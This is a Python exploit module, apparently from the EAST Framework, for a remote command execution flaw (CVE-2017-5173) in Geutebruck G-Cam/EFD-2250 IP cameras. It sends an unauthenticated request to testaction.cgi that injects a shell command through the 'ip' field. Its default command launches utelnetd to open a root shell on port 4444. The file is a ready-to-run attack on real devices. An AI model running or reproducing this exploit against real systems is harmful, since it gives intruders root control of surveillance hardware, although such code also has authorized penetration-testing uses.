#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2
import base64
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_geuterbruck_g_cam_rce"
INFO['DESCRIPTION'] = "Geutebruck 5.02024 G-Cam/EFD-2250 - Remote Command Execution"
INFO['VENDOR'] = "http://geutebruck.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41360/', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-045-02']
INFO["CVE Name"] = "2017-5173"
INFO["NOTES"] = """Vulnerability exists in the /uapi-cgi/viewer/testaction.cgi page and allows an anonymous user to execute arbitrary commands with root privileges. Firmware <= 1.11.0.12 are concerned."""

INFO['CHANGELOG'] = "16 Feb, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["COMMAND"] = 'utelnetd -l /bin/sh -p 4444 -d', dict(description = 'Command')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
        
    def run(self):
        self.args()
        
        data = 'type=ip&ip=eth0 1.1.1.1;' + self.command
        request = urllib2.Request(self.make_url('/uapi-cgi/viewer/testaction.cgi'), data)
        
        self.log('Sending packet ...')
        try:
            fd = urllib2.urlopen(request)
            self.log(fd.read())
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

